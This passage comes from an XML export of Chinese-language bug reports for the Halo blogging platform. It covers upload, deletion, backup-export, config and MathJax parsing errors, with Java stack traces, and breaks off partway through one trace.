		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境 版本：1.3.2 数据库：H2 1.4.196 (2017-06-10) 运行模式：production 启动时间：2020-07-07 21:12 &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志 ``` Caused by: java.nio.file.NoSuchFileException: /root/.halo/upload/2020/07/docker-463320b8a3be4a5d87329966537c3aed.jpg at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86) ~[na:1.8.0_252] at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102) ~[na:1.8.0_252] at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107) ~[na:1.8.0_252] at sun.nio.fs.UnixFileSystemProvider.implDelete(UnixFileSystemProvider.java:244) ~[na:1.8.0_252] at sun.nio.fs.AbstractFileSystemProvider.delete(AbstractFileSystemProvider.java:103) ~[na:1.8.0_252] at java.nio.file.Files.delete(Files.java:1126) ~[na:1.8.0_252] at run.halo.app.handler.file.LocalFileHandler.delete(LocalFileHandler.java:190) ~[classes!/:na] ... 100 common frames omitted ```  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为 我的服务器由于某些原因重置了。在这之前我备份了halo（数据备份）。 当我重新安装halo并且导入备份之后，发现我的图片数据还存在，但图片为空。 我想删除这些空的图片并重新上传新的图片  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为 删除图片就会出现 [错误日志](#错误日志) 这样的错误信息。导致我无法删除旧的图片。 这可能是由于读取文件目录为空导致的BUG。 &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-07-07 14:31:43</created>
		<closed>2020-07-07 15:30:00</closed>
	</bug>
	<bug>
		<id>947</id>
		<title>安装的时候那个主题文件有问题吧？</title>
		<body>docker最新的镜像 配置yaml文件为自己的mysql数据库然后去网页上初始化会报错  启动成功后先不去初始化   把anatole主题换成anatole github上最新的一份release代码就ok了</body>
		<created>2020-07-05 14:10:59</created>
		<closed>2020-07-07 01:42:50</closed>
	</bug>
	<bug>
		<id>928</id>
		<title>最新版本上传文件出现BUG</title>
		<body>&lt;!--   如果你有任何问题也可以通过此渠道来向我们反馈。    谢谢！ --&gt; 重启也不行.   ```java 2020-06-21 21:30:00.217 ERROR 21601 --- [  XNIO-1 task-3] io.undertow.request                      : UT005023: Exception handling request to /api/admin/attachments/upload  java.lang.RuntimeException: java.nio.file.NoSuchFileException: /data/upload_tmp/undertow.6738298393645750953.8090/\/data/upload_tmp/undertow3307954452084769537upload         at io.undertow.server.handlers.form.MultiPartParserDefinition$MultiPartUploadHandler.beginPart(MultiPartParserDefinition.java:261) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]         at io.undertow.util.MultipartParser$ParseState.headerName(MultipartParser.java:208) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]         at io.undertow.util.MultipartParser$ParseState.parse(MultipartParser.java:123) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]         at io.undertow.server.handlers.form.MultiPartParserDefinition$MultiPartUploadHandler.parseBlocking(MultiPartParserDefinition.java:232) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]         at io.undertow.servlet.spec.HttpServletRequestImpl.parseFormData(HttpServletRequestImpl.java:835) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] ```</body>
		<created>2020-06-21 13:32:12</created>
		<closed>2020-07-15 14:36:10</closed>
	</bug>
	<bug>
		<id>923</id>
		<title>注册成服务时无法读取配置文件信息</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境 版本：1.3.2 数据库：MySQL 5.7.18-20170830-log 运行模式：production User Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为 在application.yaml中配置了数据库以及端口信息，halo用户使用java -jar 命令启动时一切正常，当注册成为系统服务时，端口变成了默认的8090。 &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-06-18 09:34:47</created>
		<closed>2020-06-18 10:52:38</closed>
	</bug>
	<bug>
		<id>897</id>
		<title>文件上传未考虑到后缀中存在半角点号的情况</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  版本：1.3.2 数据库：H2 1.4.196 (2017-06-10) 运行模式：production User Agent：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  无  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  不会分割  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;  详情请查看 https://bbs.halo.run/d/861-targz</body>
		<created>2020-06-06 13:48:49</created>
		<closed>2020-09-14 05:15:00</closed>
	</bug>
	<bug>
		<id>889</id>
		<title>MathJax公式解析的问题</title>
		<body>看到之前有人反馈过LaTeX解析的问题，暂时的解决步骤是外面再包一层，但这对于导入之前的文章和一般的作文习惯有异，还是兼容已有的标准好一些，不管是迁移还是重复使用 查阅了halo的源码在 https://github.com/halo-dev/halo/blob/master/src/main/java/run/halo/app/utils/MarkdownUtils.java#L41-L51 ### 对于inline-math  Superscript会解析`^...^`之间的内容为上标  ### 对于block-math  Attributes Extension会转换`{...}`之间的内容根据几种规则  - name=value - name='value' - name="value" - \#id - .class  这就导致在LaTeX中下标或者上标赋值的时候发生解析问题  暂时还没看完halo的源码，不清楚在关闭这两项内容可能导致的问题，现在只是复现问题，关闭上述两项可以解析成功</body>
		<created>2020-06-03 02:08:16</created>
		<closed>2020-06-09 00:42:49</closed>
	</bug>
	<bug>
		<id>872</id>
		<title>在Mac环境下导出的文件会存在.DS_Store</title>
		<body>com.alibaba.fastjson.JSONException: syntax error, pos 1, line 1, column 2PK�S�Phalo-dev/PKPK�S�Phalo-dev/.DS_Store�=  ![image](https://user-images.githubusercontent.com/37538641/82724924-01960a00-9d0c-11ea-99a3-08f62ba8964f.png) </body>
		<created>2020-05-23 07:42:59</created>
		<closed>2020-05-25 09:58:10</closed>
	</bug>
	<bug>
		<id>853</id>
		<title>整站数据备份和数据库数据导出失败。</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  版本：1.3.2 数据库：H2 1.4.196 (2017-06-10) 运行模式：production User Agent：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ``` 2020-05-15 23:08:50.769 ERROR 616 --- [XNIO-1 task-6] r.h.app.core.ControllerExceptionHandler  : Captured an exception  run.halo.app.exception.ServiceException: 导出数据失败 at run.halo.app.service.impl.BackupServiceImpl.exportData(BackupServiceImpl.java:304) ~[classes!/:na] at run.halo.app.controller.admin.api.BackupController.exportData(BackupController.java:97) ~[classes!/:na] at run.halo.app.controller.admin.api.BackupController$$FastClassBySpringCGLIB$$810ea7c7.invoke(&lt;generated&gt;) ~[classes!/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:na] at jdk.internal.reflect.GeneratedMethodAccessor303.invoke(Unknown Source) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.handler.aspect.DisableOnConditionAspect.around(DisableOnConditionAspect.java:43) ~[classes!/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.controller.admin.api.BackupController$$EnhancerBySpringCGLIB$$ca126f0f.exportData(&lt;generated&gt;) ~[classes!/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:879) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:116) ~[classes!/:na] at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:191) ~[classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) ~[classes!/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) ~[classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) ~[spring-boot-actuator-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.lang.Thread.run(Thread.java:834) ~[na:na] Caused by: java.nio.file.NoSuchFileException: /tmp/halo-data-export/halo-data-export-2020-05-15-23-08-50-2145104111.json at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116) ~[na:na] at java.base/sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:219) ~[na:na] at java.base/java.nio.file.Files.newByteChannel(Files.java:370) ~[na:na] at java.base/java.nio.file.Files.createFile(Files.java:647) ~[na:na] at run.halo.app.service.impl.BackupServiceImpl.exportData(BackupServiceImpl.java:297) ~[classes!/:na] ... 106 common frames omitted  2020-05-15 23:08:59.501  WARN 616 --- [Timer-0] run.halo.app.cache.AbstractCacheStore    : Cache key: [cache_lock_public run.halo.app.security.token.AuthToken run.halo.app.controller.admin.api.AdminController.refresh(java.lang.String)] has been expired 2020-05-15 23:09:21.143 ERROR 616 --- [XNIO-1 task-2] r.h.app.core.ControllerExceptionHandler  : Captured an exception  run.halo.app.exception.ServiceException: 导出数据失败 at run.halo.app.service.impl.BackupServiceImpl.exportData(BackupServiceImpl.java:304) ~[classes!/:na] at run.halo.app.controller.admin.api.BackupController.exportData(BackupController.java:97) ~[classes!/:na] at run.halo.app.controller.admin.api.BackupController$$FastClassBySpringCGLIB$$810ea7c7.invoke(&lt;generated&gt;) ~[classes!/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:na] at jdk.internal.reflect.GeneratedMethodAccessor303.invoke(Unknown Source) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at 